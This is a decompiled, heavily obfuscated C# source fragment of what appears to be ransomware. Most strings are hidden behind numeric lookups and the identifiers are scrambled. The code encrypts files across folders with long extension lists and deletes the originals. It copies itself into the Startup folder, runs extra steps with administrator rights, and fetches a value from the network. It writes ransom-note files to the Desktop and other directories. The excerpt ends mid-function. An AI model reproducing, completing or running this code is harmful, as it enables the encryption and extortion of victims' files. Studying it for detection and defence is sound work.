										chNSgfSgFKJs(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
									}
									else
									{
										chNSgfSgFKJs(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex11)
								{
									if (VLajbDNhoSbf)
									{
										try
										{
											File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107386386) + ex11.Message + getString_0(107396343));
										}
										catch (Exception)
										{
										}
									}
									uAQgXZmBeIANml++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!qtSCtAyEKwnBa)
						{
							if (!AcumuDDlRST)
							{
								MDGJMFjWgcsbCsl(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107386427), oybyixAEyQBUaM);
							}
							else
							{
								MDGJMFjWgcsbCsl(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107386427), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!AcumuDDlRST)
								{
									chNSgfSgFKJs(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
								}
								else
								{
									chNSgfSgFKJs(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex14)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
										File.AppendAllText(MGkBzYPheHDPb, getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107386386) + ex14.Message + getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								return;
							}
						}
						if (AcumuDDlRST)
						{
							if (utySFCfMcfJj != getString_0(107386432))
							{
								hOfBAzalVlDAWcj(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, bytes2);
							}
							else
							{
								hOfBAzalVlDAWcj(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0b2a;
			IL_0b2a:
			UWBePPalaohE.Remove(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
		}

		static FxgjJBeAgKI()
		{
			Strings.CreateGetStringDelegate(typeof(FxgjJBeAgKI));
		}
	}

	private sealed class VYqCPtfxuGjAcnc
	{
		public string eltoobQHQxyj;

		public string sIPOkqlVRtqKbWj;

		public void _003CEncrypt2_003Eb__40()
		{
			while (true)
			{
				try
				{
					File.Delete(eltoobQHQxyj);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__41()
		{
			while (true)
			{
				try
				{
					if (File.Exists(sIPOkqlVRtqKbWj))
					{
						File.Delete(sIPOkqlVRtqKbWj);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string wUDkdnCGLMOs;

	public static byte[] oybyixAEyQBUaM;

	public static string VIsIdhZRykLqTUQDB;

	public static string xtbYgrRCEXRhIt;

	public static List<string> jwBOsivrxmQ;

	public static List<string> rpxCtxXAXaqO;

	public static string sfTwxMnKqH;

	public static string pPYjMJSGlCKrKN;

	public static string MLaZeafODt;

	public static string OXVbUzKTVitWIr;

	public static string tXzockTHFc;

	public static int HBRweUbQOIMdbZZp;

	public static string hbiMFBxXkVIgur;

	public static string joSdEOhiuznF;

	public static string PqJDLaSNaTyq;

	public static string qPJcttYtoGQxk;

	public static string pHrGJqOZIctkX;

	public static string odoeVPlCXvoFQPOL;

	public static string PaFnRkZFdGu;

	public static string KHZEvaaAjnAHLm;

	public static List<string> tAtyTsIAxbjQvxo;

	public static List<string> CyfMkozTWVl;

	public static string XndNHYXWpvB;

	public static string uLLsUdDbXoEVQ;

	public static string FCVCIbLfbkOUFF;

	public static List<string> ngVLNnblfHHw;

	public static string MvoNMddyflMC;

	private static string mNEuIvkieOf;

	public static string PEOsufOVorqNP;

	public static string BdLuVqHofum;

	public static List<string> malBhCqwsAb;

	public static List<string> fKSEXFuwhxqo;

	public static List<string> sCGElgUFAvuF;

	public static List<string> xeIMBaJAxSsDB;

	public static string ShXoyCWZDyXwi;

	public static List<string> EfmWSoVDSebqevqR;

	public static List<string> fPrxwqfsud;

	public static string qAzXftneDtps;

	public static string HsZkMcTFckYW;

	internal static DateTime xiONLqHaZct;

	internal static DateTime jGXHuOBPPgtKz;

	public static string DuwAfCYTUCT;

	public static string SHZkgBAmdkcxAL;

	public static string bEizJfDhNZQq;

	public static string FGSAPCQYxv;

	public static string OtSMNKJbubH;

	public static string zbgyTsJtDee;

	public static string AogNSkFhtWihX;

	public static string SFDpinVUmMSqKHuE;

	public static List<string> sAdxWTwIriShHsff;

	public static string YzEXDgkVctSKX;

	public static string ljXGZTEjpxSlR;

	public static string yZeWShcxZWoWCA;

	public static string WjKjLyPEIXdw;

	public static string qTQAnNPXefQJG;

	public static string HKveNHqmcCcd;

	public static string FiZbwLuPSlAw;

	public static string cLyvUOjuymTe;

	public static string PXSTfaCtML;

	public static string csYWOlqSSo;

	public static string eVpxYpRfqa;

	public static string TLCzgPMposi;

	public static string ovnANMfJRksfC;

	public static string LNYeQleHVCaotD;

	public static string psvtrVxGuDGR;

	public static string sWLGwUQDDISenWIL;

	public static string djPRdBrPDbwciX;

	public static string kmCxiOJvslMKl;

	public static string JckzaJkTNZBlbcc;

	public static string NnEdFRIdEjUNKn;

	public static string XmxvSLbGDWQx;

	public static string bFDfWKkWoli;

	public static string atVhanzdqXfhb;

	public static string kegyisOKPkiLZ;

	public static string ypzGMFIykfAhE;

	public static string fpFrhBxfnPX;

	public static string QYWNitRbofuBkTAcs;

	public static string pMjcTzqCudiSy;

	public static string ZKhoLenETDJl;

	public static string[] MWvvpEiADk;

	public static string FTilkCJiPZSoYC;

	public static bool rqILzTAnaGs;

	public static string nNKYHJkkrAiE;

	public static bool AcumuDDlRST;

	public static bool LAWnVrdYZglWd;

	public static bool RJKYNoslDCRyE;

	public static bool cYedAGEIfl;

	public static string MGkBzYPheHDPb;

	public static bool VLajbDNhoSbf;

	public static bool RKupSfKdGWcSjGQ;

	public static bool rWsrMDdHFQmC;

	public static bool kwebbXGLWFTcp;

	public static bool qtSCtAyEKwnBa;

	public static string iMvajZNuOYl;

	public static bool RiGciHwEXLcD;

	public static Stopwatch lgTppZwtgUy;

	public static int uAQgXZmBeIANml;

	public static int ywaYFjHsMFpWdbL;

	public static bool vzooNONBAAoJ;

	public static string zwSwCGajjNfu;

	public static string[] DiTjsfekHbbSPJE;

	public static List<string> bopDeifAQZQuf;

	public static int rqDMxhDDSWkTsJ;

	public static bool YAyTMwdzmcgjIt;

	public static List<string> IJrbxyWohjq;

	public static List<string> EtPFNLmGNUqcxn;

	public static List<string> kxbbIsTeiCvyb;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate19;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		//IL_14e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1504: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			RiPRfhSjod CS_0024_003C_003E8__locals0 = new RiPRfhSjod();
			CS_0024_003C_003E8__locals0.RUNABRXajzYGN = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.RUNABRXajzYGN) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			qGvFVDLSHyCK.ZgRbyLxxCtuYjY(mNEuIvkieOf);
		}
		catch (Exception)
		{
		}
		try
		{
			if (fpFrhBxfnPX == getString_0(107396853))
			{
				Thread thread = new Thread(ztVqaXKbISVjNpqQC.eeNyBKaotZE);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (PqJDLaSNaTyq == getString_0(107396853))
		{
			Thread.Sleep(int.Parse(qPJcttYtoGQxk));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && AogNSkFhtWihX == getString_0(107396853))
		{
			try
			{
				AEUbRIwmYeKcua(wcGmwtolXpKf(getString_0(107396880)));
			}
			catch
			{
			}
		}
		try
		{
			if (PaFnRkZFdGu == getString_0(107396853) && qxQqkJVGZxRE.ialcSoFYCWzHcnZwVb())
			{
				new kdqBEzhIUc().qMiNaaEKwNIlITHQ(bool_0: false);
				qxQqkJVGZxRE.uBrTxlBOaqWTh();
			}
		}
		catch (Exception)
		{
		}
		if (uLLsUdDbXoEVQ == getString_0(107396853) && qxQqkJVGZxRE.ialcSoFYCWzHcnZwVb())
		{
			new kdqBEzhIUc().qMiNaaEKwNIlITHQ(bool_0: false);
			new kdqBEzhIUc().fCsAhHfnjGu();
		}
		if (joSdEOhiuznF == getString_0(107396853))
		{
			hsvzYLSlqx.npamoiKQqOX();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396775);
			string text2 = text + Path.GetFileName(fileName);
			if (tXzockTHFc == getString_0(107396853) && fileName != text2)
			{
				Thread thread2 = new Thread(RQUiqIqcSpMSh);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (sfTwxMnKqH == getString_0(107396853) && mainModule != null && fileName != text2)
			{
				try
				{
					HBRweUbQOIMdbZZp = ReFMgGBdkgXDPi(0, tAtyTsIAxbjQvxo.Count);
					File.Copy(fileName, text + tAtyTsIAxbjQvxo[HBRweUbQOIMdbZZp], overwrite: true);
					Process.Start(text + tAtyTsIAxbjQvxo[HBRweUbQOIMdbZZp]);
					xcaeYZPGZgKKc();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (qAzXftneDtps == getString_0(107396853) && DateTime.Now < xiONLqHaZct)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (HsZkMcTFckYW == getString_0(107396853) && DateTime.Now > jGXHuOBPPgtKz)
			{
				xcaeYZPGZgKKc();
			}
		}
		catch
		{
		}
		bYoeNeBSpqUE();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> source = fKSEXFuwhxqo;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386346)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> source2 = sCGElgUFAvuF;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386301)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (ZKhoLenETDJl == getString_0(107396853))
				{
					string[] mWvvpEiADk = MWvvpEiADk;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386301)), getString_0(107386308) + string_0 + getString_0(107386267));
						};
					}
					Parallel.ForEach(mWvvpEiADk, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!fSJKiQHscLg().Contains(getString_0(107386028)))
				{
					MquKelznTSTt(ShXoyCWZDyXwi);
				}
				else
				{
					List<string> source3 = xeIMBaJAxSsDB;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							ZMMcdzUOldsoj(wcGmwtolXpKf(AeqRpGGGnSrlvi(getString_0(107386262))), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> efmWSoVDSebqevqR = EfmWSoVDSebqevqR;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386237)), string_0);
					};
				}
				Parallel.ForEach(efmWSoVDSebqevqR, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396738))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396738)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396753)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !jwBOsivrxmQ.Contains(text6) && text6 != getString_0(107397212) && text6 != getString_0(107397223) && text6 != getString_0(107397202))
								{
									jwBOsivrxmQ.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397141)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397160))
						{
							ovnANMfJRksfC = getString_0(107396853);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397119))
						{
							ovnANMfJRksfC = getString_0(107397110);
						}
					}
					if (text3.Contains(getString_0(107397137)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397160))
						{
							RiGciHwEXLcD = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397119))
						{
							RiGciHwEXLcD = false;
						}
					}
					if (text3.Contains(getString_0(107397088)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397160))
						{
							VLajbDNhoSbf = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397119))
						{
							VLajbDNhoSbf = false;
						}
					}
					if (text3.Contains(getString_0(107397075)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397160))
						{
							YAyTMwdzmcgjIt = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397119))
						{
							YAyTMwdzmcgjIt = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107397046) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (ovnANMfJRksfC == getString_0(107397110))
		{
			uqnjKildcmP();
		}
		if (ovnANMfJRksfC == getString_0(107396853))
		{
			try
			{
				IFXniAHbpQhNBUaFd();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && RJKYNoslDCRyE)
			{
				try
				{
					Thread thread4 = new Thread(CkFJDetLAWA.lMZneRIifpgvfZVb);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ZMMcdzUOldsoj(getString_0(107397033), wcGmwtolXpKf(getString_0(107396988)));
		}
		SecureString secureString = new SecureString();
		if (bEizJfDhNZQq == getString_0(107397110))
		{
			pPYjMJSGlCKrKN = xgcaYSxbaKKYuMD.WocDKMFkPpSXo(32);
			MLaZeafODt = xgcaYSxbaKKYuMD.YKhjYVOWMHQY();
		}
		else
		{
			pPYjMJSGlCKrKN = getString_0(107396403);
		}
		OXVbUzKTVitWIr = FNswwgGAUxLCaAC.ahNxsEtgrSV(pPYjMJSGlCKrKN + MLaZeafODt);
		if (rWsrMDdHFQmC)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), iMvajZNuOYl)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), iMvajZNuOYl), string.Concat(wcGmwtolXpKf(getString_0(107396390)), new WebClient().DownloadString(wcGmwtolXpKf(getString_0(107396365))), getString_0(107396324), wcGmwtolXpKf(getString_0(107396287)), DateTime.Now, getString_0(107396324), wcGmwtolXpKf(getString_0(107396246)), OXVbUzKTVitWIr));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), iMvajZNuOYl), getString_0(107396701) + OXVbUzKTVitWIr);
				}
			}
			catch (Exception ex9)
			{
				if (VLajbDNhoSbf)
				{
					try
					{
						File.AppendAllText(MGkBzYPheHDPb, getString_0(107396672) + ex9.Message + getString_0(107396324));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		SkkhlYhQlc.UJFBeXkKlyCUYC(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), NnEdFRIdEjUNKn), VAHCeUsPiFi(OXVbUzKTVitWIr), null, null, getString_0(107396655), getString_0(107396606), null);
		if (FiZbwLuPSlAw == getString_0(107396853) && args.Length > 0)
		{
			try
			{
				if (!File.Exists(args[0]))
				{
					biNZUHxwhHJ(new string[1] { args[0] }, new string[100]
					{
						getString_0(107396621),
						getString_0(107396616),
						getString_0(107396611),
						getString_0(107396570),
						getString_0(107396565),
						getString_0(107396592),
						getString_0(107396587),
						getString_0(107396582),
						getString_0(107396545),
						getString_0(107396540),
						getString_0(107396535),
						getString_0(107396562),
						getString_0(107396553),
						getString_0(107396548),
						getString_0(107396507),
						getString_0(107396502),
						getString_0(107396529),
						getString_0(107396524),
						getString_0(107396519),
						getString_0(107396482),
						getString_0(107396473),
						getString_0(107396468),
						getString_0(107396495),
						getString_0(107396490),
						getString_0(107396485),
						getString_0(107395936),
						getString_0(107395931),
						getString_0(107395926),
						getString_0(107395953),
						getString_0(107395948),
						getString_0(107395943),
						getString_0(107395906),
						getString_0(107395901),
						getString_0(107395896),
						getString_0(107395919),
						getString_0(107395914),
						getString_0(107395909),
						getString_0(107395872),
						getString_0(107396587),
						getString_0(107395867),
						getString_0(107396545),
						getString_0(107395890),
						getString_0(107395885),
						getString_0(107395880),
						getString_0(107395875),
						getString_0(107395838),
						getString_0(107395833),
						getString_0(107395828),
						getString_0(107395855),
						getString_0(107395850),
						getString_0(107395845),
						getString_0(107395808),
						getString_0(107395803),
						getString_0(107395798),
						getString_0(107395825),
						getString_0(107395820),
						getString_0(107395815),
						getString_0(107395778),
						getString_0(107395769),
						getString_0(107395764),
						getString_0(107395787),
						getString_0(107395742),
						getString_0(107395867),
						getString_0(107395761),
						getString_0(107395752),
						getString_0(107395711),
						getString_0(107395702),
						getString_0(107395725),
						getString_0(107395716),
						getString_0(107396191),
						getString_0(107396182),
						getString_0(107396205),
						getString_0(107396196),
						getString_0(107396159),
						getString_0(107396154),
						getString_0(107396149),
						getString_0(107396176),
						getString_0(107396171),
						getString_0(107396166),
						getString_0(107396125),
						getString_0(107396120),
						getString_0(107396115),
						getString_0(107396142),
						getString_0(107396137),
						getString_0(107396132),
						getString_0(107396091),
						getString_0(107396114),
						getString_0(107396109),
						getString_0(107395901),
						getString_0(107396104),
						getString_0(107396099),
						getString_0(107396062),
						getString_0(107396057),
						getString_0(107396052),
						getString_0(107396075),
						getString_0(107396070),
						getString_0(107396033),
						getString_0(107396024),
						getString_0(107396019),
						getString_0(107396046)
					}, new string[0], pPYjMJSGlCKrKN, getString_0(107396041));
					if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992)))
					{
						using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992));
						streamWriter.WriteLine(wcGmwtolXpKf(getString_0(107395959)));
						streamWriter.WriteLine(getString_0(107396324));
						streamWriter.WriteLine(wcGmwtolXpKf(getString_0(107394013)));
						streamWriter.WriteLine(OXVbUzKTVitWIr);
						if (PEOsufOVorqNP == getString_0(107397110))
						{
							streamWriter.WriteLine(getString_0(107396324));
							streamWriter.WriteLine(wcGmwtolXpKf(getString_0(107393980)) + Convert.ToString(ngVLNnblfHHw.Count));
						}
						if (vzooNONBAAoJ)
						{
							streamWriter.WriteLine(getString_0(107396324));
							streamWriter.WriteLine(wcGmwtolXpKf(getString_0(107393935)));
							streamWriter.WriteLine(ZAUYlWQzUcjJsT.FkWAcFxnCvQ());
						}
					}
					else if (!AcumuDDlRST)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992), getString_0(107393390) + OXVbUzKTVitWIr);
					}
					{
						foreach (string item in CyfMkozTWVl)
						{
							if (!(item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
							{
								try
								{
									if (!File.Exists(item + getString_0(107395992)))
									{
										File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992), item + getString_0(107395992), overwrite: true);
									}
									else if (!AcumuDDlRST)
									{
										File.AppendAllText(item + getString_0(107395992), getString_0(107393390) + OXVbUzKTVitWIr);
									}
								}
								catch (Exception)
								{
								}
							}
						}
						return;
					}
				}
				MessageBox.Show(getString_0(107393361));
				return;
			}
			catch
			{
				MessageBox.Show(getString_0(107393361));
				return;
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			LPAdufvaeyUjKQN();
		}
		try
		{
			try
			{
				if (RiGciHwEXLcD)
				{
					Console.WriteLine(getString_0(107393240));
				}
			}
			catch
			{
			}
			biNZUHxwhHJ(new string[26]
			{
				getString_0(107393223),
				getString_0(107393186),
				getString_0(107393181),
				getString_0(107393176),
				getString_0(107393171),
				getString_0(107393198),
				getString_0(107393193),
				getString_0(107393188),
				getString_0(107393151),
				getString_0(107393146),
				getString_0(107393141),
				getString_0(107393168),
				getString_0(107393163),
				getString_0(107393158),
				getString_0(107393633),
				getString_0(107393628),
				getString_0(107393623),
				getString_0(107393650),
				getString_0(107393645),
				getString_0(107393640),
				getString_0(107393635),
				getString_0(107393598),
				getString_0(107393593),
				getString_0(107393588),
				getString_0(107393615),
				getString_0(107393610)
			}, new string[100]
			{
				getString_0(107396621),
				getString_0(107396616),
				getString_0(107396611),
				getString_0(107396570),
				getString_0(107396565),
				getString_0(107396592),
				getString_0(107396587),
				getString_0(107396582),
				getString_0(107396545),
				getString_0(107396540),
				getString_0(107396535),
				getString_0(107396562),
				getString_0(107396553),
				getString_0(107396548),
				getString_0(107396507),
				getString_0(107396502),
				getString_0(107396529),
				getString_0(107396524),
				getString_0(107396519),
				getString_0(107396482),
				getString_0(107396473),
				getString_0(107396468),
				getString_0(107396495),
				getString_0(107396490),
				getString_0(107396485),
				getString_0(107395936),
				getString_0(107395931),
				getString_0(107395926),
				getString_0(107395953),
				getString_0(107395948),
				getString_0(107395943),
				getString_0(107395906),
				getString_0(107395901),
				getString_0(107395896),
				getString_0(107395919),
				getString_0(107395914),
				getString_0(107395909),
				getString_0(107395872),
				getString_0(107396587),
				getString_0(107395867),
				getString_0(107396545),
				getString_0(107395890),
				getString_0(107395885),
				getString_0(107395880),
				getString_0(107395875),
				getString_0(107395838),
				getString_0(107395833),
				getString_0(107395828),
				getString_0(107395855),
				getString_0(107395850),
				getString_0(107395845),
				getString_0(107395808),
				getString_0(107395803),
				getString_0(107395798),
				getString_0(107395825),
				getString_0(107395820),
				getString_0(107395815),
				getString_0(107395778),
				getString_0(107395769),
				getString_0(107395764),
				getString_0(107395787),
				getString_0(107395742),
				getString_0(107395867),
				getString_0(107395761),
				getString_0(107395752),
				getString_0(107395711),
				getString_0(107395702),
				getString_0(107395725),
				getString_0(107395716),
				getString_0(107396191),
				getString_0(107396182),
				getString_0(107396205),
				getString_0(107396196),
				getString_0(107396159),
				getString_0(107396154),
				getString_0(107396149),
				getString_0(107396176),
				getString_0(107396171),
				getString_0(107396166),
				getString_0(107396125),
				getString_0(107396120),
				getString_0(107396115),
				getString_0(107396142),
				getString_0(107396137),
				getString_0(107396132),
				getString_0(107396091),
				getString_0(107396114),
				getString_0(107396109),
				getString_0(107395901),
				getString_0(107396104),
				getString_0(107396099),
				getString_0(107396062),
				getString_0(107396057),
				getString_0(107396052),
				getString_0(107396075),
				getString_0(107396070),
				getString_0(107396033),
				getString_0(107396024),
				getString_0(107396019),
				getString_0(107396046)
			}, new string[0], pPYjMJSGlCKrKN, getString_0(107396041));
		}
		catch (Exception ex12)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107393605) + ex12.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992)))
			{
				using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992));
				streamWriter2.WriteLine(wcGmwtolXpKf(getString_0(107395959)));
				streamWriter2.WriteLine(getString_0(107396324));
				streamWriter2.WriteLine(wcGmwtolXpKf(getString_0(107394013)));
				streamWriter2.WriteLine(OXVbUzKTVitWIr);
				if (PEOsufOVorqNP == getString_0(107397110))
				{
					streamWriter2.WriteLine(getString_0(107396324));
					streamWriter2.WriteLine(wcGmwtolXpKf(getString_0(107393980)) + Convert.ToString(ngVLNnblfHHw.Count));
				}
				if (vzooNONBAAoJ)
				{
					streamWriter2.WriteLine(getString_0(107396324));
					streamWriter2.WriteLine(wcGmwtolXpKf(getString_0(107393935)));
					streamWriter2.WriteLine(ZAUYlWQzUcjJsT.FkWAcFxnCvQ());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992));
				if (!text11.Contains(OXVbUzKTVitWIr) && !AcumuDDlRST)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992), getString_0(107393390) + OXVbUzKTVitWIr);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item2 in CyfMkozTWVl)
		{
			num++;
			try
			{
				if (item2 == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item2 + getString_0(107395992)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992), item2 + getString_0(107395992), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992));
					if (!text12.Contains(OXVbUzKTVitWIr) && !AcumuDDlRST)
					{
						File.AppendAllText(item2 + getString_0(107395992), getString_0(107393390) + OXVbUzKTVitWIr);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!cYedAGEIfl && num > 10)
			{
				break;
			}
		}
		if (atVhanzdqXfhb == getString_0(107396853))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393580)))
				{
					using StreamWriter streamWriter3 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393580));
					streamWriter3.WriteLine(wcGmwtolXpKf(getString_0(107393547)));
					streamWriter3.WriteLine(getString_0(107396324));
					streamWriter3.WriteLine(wcGmwtolXpKf(getString_0(107389857)));
